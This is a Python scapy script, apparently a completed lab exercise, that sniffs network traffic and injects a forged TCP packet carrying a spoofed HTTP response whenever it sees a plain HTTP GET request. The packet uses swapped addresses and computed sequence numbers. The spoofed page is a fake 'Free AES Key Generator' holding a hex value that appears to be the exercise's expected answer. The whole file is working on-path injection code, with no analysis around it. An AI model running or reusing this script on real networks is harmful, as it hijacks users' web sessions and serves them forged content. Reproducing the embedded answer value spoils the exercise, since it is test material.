#!/usr/bin/python3
import socket
import scapy
from scapy.all import *

def inject_pkt(pkt):
    #import dnet
    #dnet.ip().send(pkt)
    conf.L3socket=L3RawSocket
    send(pkt)

######
# edit this function to do your attack
######
def handle_pkt(pkt):
    if("GET / HTTP/1.1" in str(pkt)):
        payload =  """HTTP/1.1 200 OK\r\nServer: nginx/1.14.0 (Ubuntu)\r\nContent-Type: text/html; charset=UTF-8\r\nContent-Length: 335\r\nConnection: close\r\n\r\n<html>\r\n<head>\r\n<title>Free AES Key Generator!</title>\r\n</head>\r\n<body>\r\n<h1 style="margin-bottom: 0px">Free AES Key Generator!</h1>\r\n<span style="font-size: 5%">Definitely not run by the NSA.</span><br/>\r\n<br/>\r\n<br/>\r\nYour <i>free</i> AES-256 key: <b>4d6167696320576f7264733a2053717565616d697368204f7373696672616765</b><br/>\r\n</body>\r\n</html>\r\n"""

        badPack = IP(src=pkt[IP].dst, dst=pkt[IP].src)/TCP(ack=pkt[TCP].seq + len(pkt[TCP].payload), seq=pkt[TCP].ack, dport=pkt[TCP].sport, sport=pkt[TCP].dport,flags='PA')/payload
        
        #        print(badPack)
        inject_pkt(badPack)


def main():
    sniff(prn=handle_pkt, filter="ip")
        

if __name__ == '__main__':
    main()
